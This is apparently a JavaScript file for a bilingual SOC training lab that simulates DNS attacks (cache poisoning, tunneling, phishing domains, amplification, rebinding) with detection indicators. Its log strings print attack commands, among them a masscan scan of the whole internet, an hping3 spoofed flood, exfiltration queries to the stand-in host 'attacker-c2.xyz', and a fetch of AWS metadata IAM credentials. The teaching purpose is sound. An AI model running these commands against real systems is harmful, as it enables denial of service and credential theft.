/* ============================================================
   dns/app.js — Lógica del Demo Lab DNS
   @xavimape · Protocolos Red SOC
   ============================================================ */

'use strict';

// ── Datos simulados ──────────────────────────────────────────
const DNS_RECORDS = {
  'example.com':    { A: '93.184.216.34',  AAAA: '2606:2800:220:1:248:1893:25c8:1946', MX: 'mail.example.com', TXT: '"v=spf1 -all"', CNAME: null },
  'google.com':     { A: '142.250.80.46',  AAAA: '2607:f8b0:4004:c07::65',             MX: 'aspmx.l.google.com', TXT: '"v=spf1 include:_spf.google.com ~all"', CNAME: null },
  'bank.com':       { A: '204.11.56.78',   AAAA: null, MX: 'mail.bank.com', TXT: '"v=spf1 ip4:204.11.56.0/24 -all"', CNAME: null },
  'cdn.example.com':{ A: null,             AAAA: null, MX: null, TXT: null, CNAME: 'example.com.cdn.cloudflare.net' },
};

const RESOLVERS = [
  { name: 'Root Server (.)', ip: '198.41.0.4',   resp: 'Referencia → servidor TLD' },
  { name: 'TLD .com',        ip: '192.5.6.30',   resp: 'Referencia → servidor autoritativo' },
  { name: 'Autoritativo',    ip: '205.251.196.1', resp: 'Respuesta final con IP y TTL' },
];

// ── Módulo principal del demo ────────────────────────────────
const dnsDemo = (function() {

  function createLogger(id) { const el=document.getElementById(id); return el ? SOC.createLogger(el) : { log: async()=>{}, clear:()=>{} }; }
  const rand    = SOC.rand;

  const t = (es, en) => (typeof i18n !== 'undefined' && i18n.getLang() === 'en') ? en : es;

  let isRunning = false;
  const output    = document.getElementById('dns-output');
  const poisonLog = document.getElementById('poison-log');

  function getLogger(el) {
    return el ? SOC.createLogger(el) : null;
  }

  // ── Demo 1: Consulta DNS paso a paso ────────────────────────
  async function runQuery() {
    if (isRunning) return;
    isRunning = true;

    const domainInput = document.getElementById('dns-domain');
    const typeSelect  = document.getElementById('dns-type');
    const domain = (domainInput.value || 'example.com').trim().toLowerCase();
    const qtype  = typeSelect.value || 'A';

    const logger = getLogger(output);
    if (!logger) { isRunning = false; return; }

    logger.clear();
    resetSteps();

    const record = DNS_RECORDS[domain];
    const answer = record ? record[qtype] : null;
    const ttl    = answer ? Math.floor(Math.random() * 3000 + 300) : null;

    const steps = [
      { msg: t(`📤 Cliente → consulta DNS: ${domain} (${qtype})`, `📤 Client → DNS query: ${domain} (${qtype})`),       type: 'info', delay: 0 },
      { msg: t(`🔍 Buscando en caché local... no encontrado`, `🔍 Searching local cache... not found`),            type: 'data', delay: 500 },
      { msg: t(`→ Enviando a Resolver (8.8.8.8) vía UDP/53`, `→ Sending to Resolver (8.8.8.8) via UDP/53`),            type: 'info', delay: 400 },
    ];

    for (const step of steps) {
      await logger.log(step.msg, step.type, step.delay);
    }

    setStep(0); // cliente

    await logger.log(t(`→ Resolver consulta Root Server (198.41.0.4)`, `→ Resolver queries Root Server (198.41.0.4)`), 'data', 600);
    setStep(1); // resolver

    await logger.log(t(`← Root: "Para .${domain.split('.').pop()}, pregunta TLD ${192}.5.6.30"`, `← Root: "For .${domain.split('.').pop()}, ask TLD ${192}.5.6.30"`), 'data', 700);
    setStep(2); // root

    await logger.log(t(`→ Resolver consulta TLD .${domain.split('.').pop()}`, `→ Resolver queries TLD .${domain.split('.').pop()}`), 'data', 600);
    setStep(3); // tld

    await logger.log(t(`← TLD: "Servidor autoritativo: 205.251.196.1"`, `← TLD: "Authoritative server: 205.251.196.1"`), 'data', 700);
    setStep(4); // autoritativo

    await logger.log(t(`→ Resolver consulta servidor autoritativo de ${domain}`, `→ Resolver queries authoritative server of ${domain}`), 'data', 600);

    if (answer) {
      await logger.log(t(`✅ Respuesta: ${domain} ${qtype} → ${answer}  TTL=${ttl}s`, `✅ Answer: ${domain} ${qtype} → ${answer}  TTL=${ttl}s`), 'ok', 700);
      await logger.log(t(`📦 Resolver guarda en caché (TTL=${ttl}s)`, `📦 Resolver caches it (TTL=${ttl}s)`), 'data', 300);
      await logger.log(t(`✅ Respuesta entregada al cliente: ${answer}`, `✅ Answer delivered to client: ${answer}`), 'ok', 400);
    } else if (record) {
      await logger.log(t(`⚠️  Registro ${qtype} no existe para ${domain}  RCODE=NOERROR`, `⚠️  Record ${qtype} does not exist for ${domain}  RCODE=NOERROR`), 'warn', 700);
      await logger.log(t(`📭 Respuesta vacía (el dominio existe, pero no tiene registro ${qtype})`, `📭 Empty answer (the domain exists but has no ${qtype} record)`), 'data', 300);
    } else {
      await logger.log(t(`❌ Dominio no encontrado: ${domain}  RCODE=NXDOMAIN`, `❌ Domain not found: ${domain}  RCODE=NXDOMAIN`), 'error', 700);
      await logger.log(t(`📭 El dominio ${domain} no existe en el DNS`, `📭 The domain ${domain} does not exist in DNS`), 'data', 300);
    }

    isRunning = false;
  }

  // ── Demo 2: DNS Cache Poisoning ──────────────────────────────
  async function runPoisoning() {
    const logger = getLogger(poisonLog);
    if (!logger) return;

    logger.clear();

    const poisonedCache = document.getElementById('cache-after');
    if (!poisonedCache) return;

    const steps = [
      { msg: t(`🔴 Iniciando ataque de Cache Poisoning...`, `🔴 Starting Cache Poisoning attack...`), type: 'error', delay: 0 },
      { msg: t(`→ Víctima consulta: bank.com A`, `→ Victim queries: bank.com A`), type: 'info', delay: 600 },
      { msg: t(`→ Atacante monitorea el tráfico UDP/53`, `→ Attacker monitors UDP/53 traffic`), type: 'warn', delay: 500 },
      { msg: t(`💉 Inundando resolver con respuestas falsas (Kaminsky)`, `💉 Flooding resolver with forged responses (Kaminsky)`), type: 'error', delay: 700 },
      { msg: t(`⚡ Adivinando Transaction ID... intentos: 1/65536`, `⚡ Guessing Transaction ID... attempts: 1/65536`), type: 'warn', delay: 400 },
      { msg: t(`⚡ Adivinando Transaction ID... intentos: 127/65536`, `⚡ Guessing Transaction ID... attempts: 127/65536`), type: 'warn', delay: 300 },
      { msg: t(`🎯 ¡Transaction ID adivinado! ID=0x4A3F`, `🎯 Transaction ID guessed! ID=0x4A3F`), type: 'error', delay: 400 },
      { msg: t(`💀 Respuesta falsa aceptada: bank.com A → 10.10.10.99 (IP del atacante)`, `💀 Forged response accepted: bank.com A → 10.10.10.99 (attacker IP)`), type: 'error', delay: 500 },
      { msg: t(`☠️  Caché ENVENENADA — TTL=86400 segundos`, `☠️  Cache POISONED — TTL=86400 seconds`), type: 'error', delay: 400 },
      { msg: t(`⚠️  Todas las consultas a bank.com ahora van al atacante`, `⚠️  All queries to bank.com now go to the attacker`), type: 'warn', delay: 300 },
    ];

    for (const step of steps) {
      await logger.log(step.msg, step.type, step.delay);
    }

    // Actualizar tabla de caché envenenada
    const tbody = poisonedCache.querySelector('tbody');
    tbody.innerHTML = `
      <tr><td>bank.com</td><td>A</td><td>93.184.216.34</td><td>300s</td></tr>
      <tr class="highlight"><td>bank.com</td><td>A</td><td>10.10.10.99 ⚠️</td><td>86400s</td></tr>
      <tr><td>example.com</td><td>A</td><td>93.184.216.34</td><td>3600s</td></tr>
      <tr><td>google.com</td><td>A</td><td>142.250.80.46</td><td>300s</td></tr>
    `;

    await logger.log(t(`✅ IOC: bank.com ahora resuelve a 10.10.10.99 en lugar de 93.184.216.34`, `✅ IOC: bank.com now resolves to 10.10.10.99 instead of 93.184.216.34`), 'warn', 500);
  }

  function resetCache() {
    const tbody = document.querySelector('#cache-after tbody');
    if (tbody) tbody.innerHTML = '<tr><td colspan="4" style="color:var(--text-muted);text-align:center;padding:1.5rem;">' + t('Esperando ataque...', 'Waiting for attack...') + '</td></tr>';
    const logger = getLogger(poisonLog);
    if (logger) {
      logger.clear();
      logger.log(t('Caché reseteada.', 'Cache reset.'), 'info', 0);
    }
  }

  // ── Indicadores de pasos ─────────────────────────────────────
  function setStep(idx) {
    const dots = document.querySelectorAll('#dns-steps .step-dot');
    dots.forEach((dot, i) => {
      dot.classList.remove('active', 'done');
      if (i < idx) dot.classList.add('done');
      if (i === idx) dot.classList.add('active');
    });
  }

  function resetSteps() {
    document.querySelectorAll('#dns-steps .step-dot').forEach(d => {
      d.classList.remove('active', 'done');
    });
  }

  function reset() {
    isRunning = false;
    resetSteps();
    const logger = getLogger(output);
    if (logger) {
      logger.clear();
      logger.log(t('Demo reseteado. Ingresá un dominio y presioná ▶ Resolver.', 'Demo reset. Enter a domain and press ▶ Resolve.'), 'info', 0);
    }
  }

  // ── Demo 3: DNS Tunneling ────────────────────────────────────
  async function runTunneling() {
    const msg    = (document.getElementById('tunnel-msg')?.value || 'datos secretos').trim();
    const qLog   = document.getElementById('tunnel-queries');
    const dLog   = document.getElementById('tunnel-detect');
    if (!qLog || !dLog) return;

    const logQ = SOC.createLogger(qLog);
    const logD = SOC.createLogger(dLog);
    logQ.clear(); logD.clear();

    // Codificar en base64 y dividir en chunks de 28 chars
    const b64     = btoa(unescape(encodeURIComponent(msg)));
    const CHUNK   = 28;
    const chunks  = b64.match(new RegExp(`.{1,${CHUNK}}`, 'g')) || [];
    const c2      = 'attacker-c2.xyz';

    await logQ.log(t(`📦 Payload original: "${msg}"`, `📦 Original payload: "${msg}"`), 'info', 0);
    await logQ.log(t(`🔐 Codificado Base64: ${b64}`, `🔐 Base64 encoded: ${b64}`), 'data', 300);
    await logQ.log(t(`✂️  Dividido en ${chunks.length} chunk(s) de ≤${CHUNK} chars`, `✂️  Split into ${chunks.length} chunk(s) of ≤${CHUNK} chars`), 'data', 300);

    for (let i = 0; i < chunks.length; i++) {
      const query = `${chunks[i]}.s${i}.${c2}`;
      await logQ.log(`DNS A ${query}`, 'warn', 350);
    }
    await logQ.log(t(`✅ Exfiltración completada — ${chunks.length} query/ies UDP/53`, `✅ Exfiltration complete — ${chunks.length} UDP/53 query/ies`), 'ok', 400);

    // Panel de detección
    const avgLen   = chunks.reduce((s, c) => s + c.length, 0) / chunks.length + c2.length + 3;
    const entropy  = shannonEntropy(b64);
    const suspicious = avgLen > 40 || entropy > 3.8;

    await logD.log(t(`── Indicadores de detección ──`, `── Detection indicators ──`), 'info', 0);
    await logD.log(t(`Longitud media de subdominio: ${avgLen.toFixed(0)} chars  ${avgLen > 40 ? '🚨 > 40' : '✅ OK'}`, `Avg subdomain length: ${avgLen.toFixed(0)} chars  ${avgLen > 40 ? '🚨 > 40' : '✅ OK'}`), avgLen > 40 ? 'error' : 'ok', 300);
    await logD.log(t(`Entropía de Shannon: ${entropy.toFixed(2)} bits  ${entropy > 3.8 ? '🚨 Alta (>3.8)' : '✅ Normal'}`, `Shannon entropy: ${entropy.toFixed(2)} bits  ${entropy > 3.8 ? '🚨 High (>3.8)' : '✅ Normal'}`), entropy > 3.8 ? 'error' : 'ok', 300);
    await logD.log(t(`Dominio C2: ${c2}  🔎 Verificar en threat-intel`, `C2 domain: ${c2}  🔎 Check threat-intel`), 'warn', 300);
    await logD.log(t(`Queries al mismo dominio base: ${chunks.length}  ${chunks.length > 2 ? '🚨 Patrón repetitivo' : '✅ Bajo volumen'}`, `Queries to same base domain: ${chunks.length}  ${chunks.length > 2 ? '🚨 Repetitive pattern' : '✅ Low volume'}`), chunks.length > 2 ? 'error' : 'ok', 300);
    await logD.log(t(`── Regla Zeek/Suricata sugerida ──`, `── Suggested Zeek/Suricata rule ──`), 'data', 400);
    await logD.log(`dns.qry.name matches /^[A-Za-z0-9+\\/]{20,}\\./`, 'data', 200);
    await logD.log(suspicious ? t(`🚨 VEREDICTO: SOSPECHOSO — escalar a L2`, `🚨 VERDICT: SUSPICIOUS — escalate to L2`) : t(`✅ VEREDICTO: Sin anomalías claras`, `✅ VERDICT: No clear anomalies`), suspicious ? 'error' : 'ok', 500);
  }

  function resetTunnel() {
    const qLog = document.getElementById('tunnel-queries');
    const dLog = document.getElementById('tunnel-detect');
    if (qLog) qLog.innerHTML = '';
    if (dLog) dLog.innerHTML = '';
  }

  // ── Demo 4: DGA Detector ─────────────────────────────────────
  async function runDGA() {
    const input  = (document.getElementById('dga-domain')?.value || '').trim().toLowerCase();
    const result = document.getElementById('dga-result');
    if (!result || !input) return;

    const log = SOC.createLogger(result);
    log.clear();

    // Extraer solo la parte del nombre (sin TLD)
    const parts   = input.split('.');
    const tld     = parts.slice(-1)[0];
    const name    = parts.slice(0, -1).join('');
    const len     = name.length;

    // Features
    const entropy    = shannonEntropy(name);
    const vowelRatio = (name.match(/[aeiou]/gi) || []).length / len;
    const digitRatio = (name.match(/[0-9]/gi)   || []).length / len;
    const suspTLDs   = ['xyz','ru','tk','top','cc','pw','info'];
    const isSuspTLD  = suspTLDs.includes(tld);
    const maxRepeat  = maxRepeatedChar(name);

    // Score
    let score = 0;
    if (len > 12)         score += 25;
    if (entropy > 3.5)    score += 30;
    if (vowelRatio < 0.2) score += 20;
    if (digitRatio > 0.3) score += 15;
    if (isSuspTLD)        score += 15;
    if (maxRepeat < 2)    score += 10;
    score = Math.min(score, 100);

    const verdict = score >= 60;

    await log.log(t(`🔎 Analizando: ${input}`, `🔎 Analyzing: ${input}`), 'info', 0);
    await log.log(`── Features ──`, 'data', 300);
    await log.log(t(`Longitud del nombre: ${len} chars  ${len > 12 ? '⚠️ > 12 (sospechoso)' : '✅ Normal'}`, `Name length: ${len} chars  ${len > 12 ? '⚠️ > 12 (suspicious)' : '✅ Normal'}`), len > 12 ? 'warn' : 'ok', 250);
    await log.log(t(`Entropía de Shannon: ${entropy.toFixed(2)} bits  ${entropy > 3.5 ? '⚠️ Alta' : '✅ Normal (<3.5)'}`, `Shannon entropy: ${entropy.toFixed(2)} bits  ${entropy > 3.5 ? '⚠️ High' : '✅ Normal (<3.5)'}`), entropy > 3.5 ? 'warn' : 'ok', 250);
    await log.log(t(`Ratio de vocales: ${(vowelRatio*100).toFixed(0)}%  ${vowelRatio < 0.2 ? '⚠️ Muy bajo (<20%)' : '✅ Normal'}`, `Vowel ratio: ${(vowelRatio*100).toFixed(0)}%  ${vowelRatio < 0.2 ? '⚠️ Very low (<20%)' : '✅ Normal'}`), vowelRatio < 0.2 ? 'warn' : 'ok', 250);
    await log.log(t(`Ratio de dígitos: ${(digitRatio*100).toFixed(0)}%  ${digitRatio > 0.3 ? '⚠️ Alto (>30%)' : '✅ Normal'}`, `Digit ratio: ${(digitRatio*100).toFixed(0)}%  ${digitRatio > 0.3 ? '⚠️ High (>30%)' : '✅ Normal'}`), digitRatio > 0.3 ? 'warn' : 'ok', 250);
    await log.log(t(`TLD .${tld}:  ${isSuspTLD ? '⚠️ TLD de alto riesgo' : '✅ TLD común'}`, `TLD .${tld}:  ${isSuspTLD ? '⚠️ High-risk TLD' : '✅ Common TLD'}`), isSuspTLD ? 'warn' : 'ok', 250);
    await log.log(`── Score DGA ──`, 'data', 300);
    await log.log(t(`Score total: ${score}/100  (umbral: 60)`, `Total score: ${score}/100  (threshold: 60)`), score >= 60 ? 'error' : 'ok', 200);
    await log.log(verdict
      ? t(`🚨 VEREDICTO: POSIBLE DGA — investigar en threat-intel, bloquear en DNS firewall`, `🚨 VERDICT: POSSIBLE DGA — investigate in threat-intel, block in DNS firewall`)
      : t(`✅ VEREDICTO: Dominio aparentemente legítimo`, `✅ VERDICT: Domain appears legitimate`),
      verdict ? 'error' : 'ok', 400);
  }

  function resetDGA() {
    const el = document.getElementById('dga-result');
    if (el) el.innerHTML = '';
  }

  // ── Utilidades de análisis ────────────────────────────────────
  function shannonEntropy(str) {
    if (!str || str.length === 0) return 0;
    const freq = {};
    for (const c of str) freq[c] = (freq[c] || 0) + 1;
    return Object.values(freq).reduce((sum, f) => {
      const p = f / str.length;
      return sum - p * Math.log2(p);
    }, 0);
  }

  function maxRepeatedChar(str) {
    let max = 0, cur = 1;
    for (let i = 1; i < str.length; i++) {
      cur = str[i] === str[i-1] ? cur + 1 : 1;
      if (cur > max) max = cur;
    }
    return max;
  }


  function resetPhishing() {
    const el = document.getElementById('phishing-output');
    if (el) el.innerHTML = '';
  }

  async function runPhishing() {
    const domain    = document.getElementById('phishing-domain').value.trim() || 'paypa1.com';
    const technique = document.getElementById('phishing-technique').value;
    const L = createLogger('phishing-output');
    L.clear();

    const legitMap = {
      typo:      { legit: 'paypal.com',  reg: 'paypa1.com' },
      homoglyph: { legit: 'paypal.com',  reg: 'pаypal.com' },
      subdomain: { legit: 'paypal.com',  reg: 'paypal.com.verify-account.io' },
      combo:     { legit: 'paypal.com',  reg: 'secure-paypal-login.com' }
    };
    const info = legitMap[technique] || { legit: 'target.com', reg: domain };

    await L.log(t('=== ANÁLISIS DE DOMINIO PHISHING ===','=== PHISHING DOMAIN ANALYSIS ==='), 'header', 0);
    await L.log(t(`Dominio analizado: ${domain}`, `Domain analyzed: ${domain}`), 'info', 100);
    await L.log(t(`Técnica detectada: ${technique}`, `Technique detected: ${technique}`), 'warn', 200);
    await L.log('', 'info', 100);

    await L.log(t('[ PASO 1: WHOIS / Registro ]','[ STEP 1: WHOIS / Registration ]'), 'header', 200);
    const regDate = new Date(Date.now() - rand(1,30)*24*3600*1000);
    await L.log(t(`Dominio: ${domain}`, `Domain: ${domain}`), 'code', 200);
    await L.log(t(`Registrado: ${regDate.toISOString().split('T')[0]} (hace ${rand(1,30)} días)`, `Registered: ${regDate.toISOString().split('T')[0]} (${rand(1,30)} days ago)`), 'attack', 300);
    await L.log(t(`Registrar: Namecheap / GoDaddy (anónimo)`, `Registrar: Namecheap / GoDaddy (anonymous)`), 'warn', 200);
    await L.log(t(`Edad del dominio: MUY NUEVO — IOC clásico de phishing`, `Domain age: VERY NEW — classic phishing IOC`), 'danger', 300);
    await L.log('', 'info', 100);

    await L.log(t('[ PASO 2: Análisis de similitud ]','[ STEP 2: Similarity Analysis ]'), 'header', 200);
    await L.log(t(`Dominio legítimo:  ${info.legit}`, `Legitimate domain:  ${info.legit}`), 'recv', 200);
    await L.log(t(`Dominio atacante:  ${info.reg}`, `Attacker domain:  ${info.reg}`), 'attack', 200);

    if (technique === 'typo') {
      await L.log(t('Técnica: Typosquatting — letra "l" reemplazada por "1"','Technique: Typosquatting — letter "l" replaced with "1"'), 'warn', 300);
      await L.log(t('Distancia Levenshtein: 1 (un carácter diferente)','Levenshtein distance: 1 (one character different)'), 'code', 200);
      await L.log(t('Detección: algoritmo fuzzy matching sobre dominios conocidos','Detection: fuzzy matching algorithm on known domains'), 'info', 200);
    } else if (technique === 'homoglyph') {
      await L.log(t('Técnica: Homoglyph — caracter cirílico U+0430 (а) en lugar de ASCII a','Technique: Homoglyph — Cyrillic char U+0430 (а) instead of ASCII a'), 'warn', 300);
      await L.log(t('Visualmente idénticos en la barra de direcciones','Visually identical in the address bar'), 'danger', 300);
      await L.log(t('Detección: decodificar Punycode → xn--pypal-4ve.com','Detection: decode Punycode → xn--pypal-4ve.com'), 'info', 200);
    } else if (technique === 'subdomain') {
      await L.log(t('Técnica: Subdomain abuse — dominio legítimo como subdominio del atacante','Technique: Subdomain abuse — legitimate domain as attacker subdomain'), 'warn', 300);
      await L.log(t('El dominio raíz es "verify-account.io" — NO "paypal.com"','Root domain is "verify-account.io" — NOT "paypal.com"'), 'danger', 300);
      await L.log(t('Detección: comparar TLD y dominio raíz, no solo el string completo','Detection: compare TLD and root domain, not just the full string'), 'info', 200);
    } else {
      await L.log(t('Técnica: Combo squatting — palabras clave que generan confianza','Technique: Combo squatting — keywords that build false trust'), 'warn', 300);
      await L.log(t('Palabras: "secure", "paypal", "login" → credibilidad falsa','Keywords: "secure", "paypal", "login" → false credibility'), 'danger', 300);
      await L.log(t('Detección: NLP sobre nombres de dominio + lista de marcas','Detection: NLP on domain names + brand list'), 'info', 200);
    }
    await L.log('', 'info', 100);

    await L.log(t('[ PASO 3: DNS lookup del dominio phishing ]','[ STEP 3: DNS lookup of phishing domain ]'), 'header', 200);
    const fakeIP = `${rand(185,195)}.${rand(100,200)}.${rand(1,254)}.${rand(1,254)}`;
    await L.log(`A     ${domain}  →  ${fakeIP}`, 'attack', 300);
    await L.log(t(`MX    ${domain}  →  mail.${domain} (captura de emails)`, `MX    ${domain}  →  mail.${domain} (email capture)`), 'attack', 200);
    await L.log(t(`TXT   ${domain}  →  v=spf1 a mx ~all (SPF configurado → evade filtros)`, `TXT   ${domain}  →  v=spf1 a mx ~all (SPF configured → evades filters)`), 'warn', 200);
    await L.log('', 'info', 100);

    await L.log(t('[ PASO 4: Certificado TLS ]','[ STEP 4: TLS Certificate ]'), 'header', 200);
    await L.log(t(`HTTPS habilitado: SI (Let's Encrypt — gratis y automático)`, `HTTPS enabled: YES (Let's Encrypt — free and automatic)`), 'danger', 300);
    await L.log(t('El candado verde NO garantiza que el sitio sea legítimo','The green lock does NOT guarantee the site is legitimate'), 'danger', 200);
    await L.log(t('Solo garantiza que la conexión está cifrada','It only guarantees the connection is encrypted'), 'warn', 200);
    await L.log('', 'info', 100);

    await L.log(t('[ VEREDICTO ]','[ VERDICT ]'), 'header', 200);
    await L.log(t(`DOMINIO PHISHING CONFIRMADO`, `PHISHING DOMAIN CONFIRMED`), 'attack', 200);
    await L.log(t(`Indicadores: dominio nuevo + similitud con marca + IP VPS anónima`, `Indicators: new domain + brand similarity + anonymous VPS IP`), 'danger', 200);
    await L.log(t('Acción: bloquear en DNS firewall, reportar al registrar, alertar usuarios','Action: block in DNS firewall, report to registrar, alert users'), 'warn', 300);
    await L.log(t('MITRE ATT&CK: T1566.002 — Phishing: Spearphishing Link','MITRE ATT&CK: T1566.002 — Phishing: Spearphishing Link'), 'info', 200);
  }


  function resetAmp() { const el=document.getElementById('amp-output'); if(el) el.innerHTML=''; }
  function resetRebind() { const el=document.getElementById('rebind-output'); if(el) el.innerHTML=''; }

  async function runAmplification() {
    const victim    = document.getElementById('amp-victim').value.trim() || '203.0.113.10';
    const resolvers = parseInt(document.getElementById('amp-resolvers').value);
    const qtype     = document.getElementById('amp-qtype').value;
    const L = createLogger('amp-output');
    L.clear();

    const ampFactor = { ANY: rand(50,100), TXT: rand(20,40), RRSIG: rand(30,60) }[qtype] || 50;
    const reqSize   = 40;
    const respSize  = reqSize * ampFactor;
    const bwGbps    = ((resolvers * respSize * 8) / 1e9).toFixed(1);

    await L.log(t('=== DNS AMPLIFICATION DDoS ===','=== DNS AMPLIFICATION DDoS ==='), 'header', 0);
    await L.log(t(`Víctima (IP spoofed): ${victim}`,`Victim (spoofed IP): ${victim}`), 'warn', 100);
    await L.log(t(`Resolvers abiertos:   ${resolvers.toLocaleString()}`,`Open resolvers:       ${resolvers.toLocaleString()}`), 'info', 100);
    await L.log(`Query type:           ${qtype}`, 'info', 100);
    await L.log(`Factor amplificación: ×${ampFactor}x`, 'attack', 200);
    await L.log('', 'info', 100);

    await L.log(t('[ PASO 1: Descubrir resolvers abiertos ]','[ STEP 1: Discover open resolvers ]'), 'header', 200);
    await L.log(t('masscan -p53 --rate 100000 0.0.0.0/0 -oL open_dns.txt','masscan -p53 --rate 100000 0.0.0.0/0 -oL open_dns.txt'), 'code', 300);
    await L.log(t(`Encontrados: ${resolvers.toLocaleString()} open resolvers`,`Found: ${resolvers.toLocaleString()} unrestricted resolvers`), 'attack', 400);
    await L.log('', 'info', 100);

    await L.log(t('[ PASO 2: Spoofear src IP y disparar queries ]','[ STEP 2: Spoof src IP and fire queries ]'), 'header', 200);
    await L.log(`hping3 --udp -p 53 --spoof ${victim} -d ${reqSize} [resolvers]`, 'code', 300);
    await L.log(t(`Paquete enviado: ${reqSize} bytes (DNS ${qtype} query)`,`Packet sent: ${reqSize} bytes (DNS ${qtype} query)`), 'send', 200);
    await L.log('', 'info', 100);

    await L.log(t('[ PASO 3: Respuestas dirigidas a la víctima ]','[ STEP 3: Responses directed to victim ]'), 'header', 200);
    for (let i = 0; i < Math.min(resolvers, 5); i++) {
      const rIP = `${rand(1,223)}.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`;
      await L.log(`${rIP}:53 → ${victim}  ${respSize} bytes`, 'attack', 150);
    }
    await L.log(t(`... ×${resolvers.toLocaleString()} resolvers simultáneos ...`,`... ×${resolvers.toLocaleString()} simultaneous resolvers ...`), 'danger', 300);
    await L.log('', 'info', 100);

    await L.log(t('[ IMPACTO ]','[ IMPACT ]'), 'header', 200);
    await L.log(t(`Tráfico sobre la víctima: ~${bwGbps} Gbps`,`Traffic on victim: ~${bwGbps} Gbps`), 'danger', 300);
    await L.log(t(`Req enviados: ${reqSize} bytes/resolver`,`Req sent: ${reqSize} bytes/resolver`), 'info', 100);
    await L.log(t(`Resp recibidos: ${respSize} bytes/resolver → amplificación ×${ampFactor}x`,`Resp received: ${respSize} bytes/resolver → amplification ×${ampFactor}x`), 'attack', 200);
    await L.log('', 'info', 100);
    await L.log(t('[ DETECCIÓN (Zeek dns.log) ]','[ DETECTION (Zeek dns.log) ]'), 'header', 200);
    await L.log(t('Mismo qname desde miles de IPs distintas en segundos','Same qname from thousands of different IPs in seconds'), 'warn', 200);
    await L.log(t('resp_size >> query_size sistemáticamente','resp_size >> query_size systematically'), 'warn', 200);
    await L.log(t('MITRE: T1498.002 — Reflection Amplification','MITRE: T1498.002 — Reflection Amplification'), 'info', 200);
  }

  async function runRebinding() {
    const domain = document.getElementById('rebind-domain').value.trim() || 'evil-rebind.com';
    const target = document.getElementById('rebind-target').value;
    const L = createLogger('rebind-output');
    L.clear();

    const targetMap = {
      router:   { ip: '192.168.1.1',      path: '/admin', desc: 'Router admin panel' },
      api:      { ip: '10.0.0.5:8080',    path: '/api/internal', desc: 'Internal API server' },
      metadata: { ip: '169.254.169.254',  path: '/latest/meta-data/iam/security-credentials/', desc: 'AWS Metadata (IAM tokens)' }
    };
    const tgt = targetMap[target];
    const pubIP = `${rand(1,200)}.${rand(1,255)}.${rand(1,255)}.${rand(1,254)}`;

    await L.log(t('=== DNS REBINDING ATTACK ===','=== DNS REBINDING ATTACK ==='), 'header', 0);
    await L.log(t(`Dominio atacante: ${domain}`,`Attacker domain: ${domain}`), 'warn', 100);
    await L.log(t(`Objetivo interno: ${tgt.ip} (${tgt.desc})`,`Internal target: ${tgt.ip} (${tgt.desc})`), 'attack', 100);
    await L.log('', 'info', 100);

    await L.log(t('[ FASE 1: Víctima visita el dominio ]','[ PHASE 1: Victim visits the domain ]'), 'header', 200);
    await L.log(`DNS query: ${domain} → ${pubIP}  TTL=1s`, 'recv', 300);
    await L.log(t(`Navegador carga: http://${domain}/ desde ${pubIP}`,`Browser loads: http://${domain}/ from ${pubIP}`), 'info', 300);
    await L.log(t('Página carga JavaScript malicioso y espera...','Page loads malicious JavaScript and waits...'), 'warn', 400);
    await L.log('', 'info', 100);

    await L.log(t('[ FASE 2: TTL expira — DNS cambia ]','[ PHASE 2: TTL expires — DNS changes ]'), 'header', 200);
    await L.log(t('Servidor DNS del atacante actualiza resolución:','Attacker DNS server updates resolution:'), 'warn', 200);
    await L.log(`${domain} → ${tgt.ip}  TTL=1s  ← IP INTERNA`, 'attack', 400);
    await L.log('', 'info', 100);

    await L.log(t('[ FASE 3: JavaScript explota Same-Origin Policy ]','[ PHASE 3: JavaScript exploits Same-Origin Policy ]'), 'header', 200);
    await L.log(`fetch("http://${domain}${tgt.path}")`, 'code', 300);
    await L.log(`Navegador resuelve ${domain} → ${tgt.ip}`, 'attack', 300);
    await L.log(t(`Petición HTTP llega a: ${tgt.ip}${tgt.path}`,`HTTP request reaches: ${tgt.ip}${tgt.path}`), 'danger', 400);

    if (target === 'metadata') {
      await L.log('', 'info', 100);
      await L.log(t('Respuesta AWS Metadata:','AWS Metadata Response:'), 'header', 200);
      await L.log('{"AccessKeyId":"ASIA...","SecretAccessKey":"wJalrXUt...","Token":"IQoJb3Jp..."}', 'attack', 400);
      await L.log(t('Token IAM temporal obtenido — acceso a S3, EC2, Lambda','Temporary IAM token obtained — access to S3, EC2, Lambda'), 'danger', 300);
    } else if (target === 'router') {
      await L.log('', 'info', 100);
      await L.log(t('Panel admin router accesible — sin autenticación','Router admin panel accessible — no authentication'), 'danger', 300);
      await L.log(t('Atacante cambia DNS del router → toda la red bajo control','Attacker changes router DNS → entire network under control'), 'danger', 300);
    } else {
      await L.log('', 'info', 100);
      await L.log(t('API interna accesible — datos internos expuestos','Internal API accessible — internal data exposed'), 'danger', 300);
      await L.log(t('Exfiltración de datos hacia servidor del atacante','Data exfiltration to attacker server'), 'danger', 300);
    }

    await L.log('', 'info', 100);
    await L.log(t('MITRE: T1557 MitM + T1090.001 Internal Proxy','MITRE: T1557 MitM + T1090.001 Internal Proxy'), 'info', 200);
    await L.log(t('Mitigación: rebind protection en resolver, no exponer servicios a 0.0.0.0','Mitigation: rebind protection in resolver, do not expose services to 0.0.0.0'), 'warn', 200);
  }

  return { runQuery, runPoisoning, resetCache, reset,
           runTunneling, resetTunnel, runDGA, resetDGA,
           runPhishing, resetPhishing,
           runAmplification, resetAmp, runRebinding, resetRebind };

})();

// Exponer al HTML
window.dnsDemo = dnsDemo;
